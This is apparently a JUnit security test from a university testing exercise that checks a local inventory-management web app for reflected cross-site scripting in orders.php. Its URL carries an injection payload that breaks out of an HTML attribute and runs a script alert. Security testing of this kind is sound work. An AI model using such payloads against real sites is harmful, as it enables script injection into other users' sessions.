package it.unitn.sectest;

import static org.junit.Assert.*;

import org.junit.Test;

import po.EditOrderPage;
import utils.BaseTest;

public class XssOrdersPhp64Min extends BaseTest{

	@Test
	public void test() {
		

		String url = "http://localhost/inventory-management-system/orders.php?o=editOrd&i=8\"/><script>alert(\"hello\")</script><input type=\"hidden\"";
		
		dashboardPage = defaultLogin();
		
		driver.get(url);
		
		editOrderPage = new EditOrderPage(driver);
		
		editOrderPage.clickAlert();
		assertTrue(editOrderPage.clickAlert());
	}

}
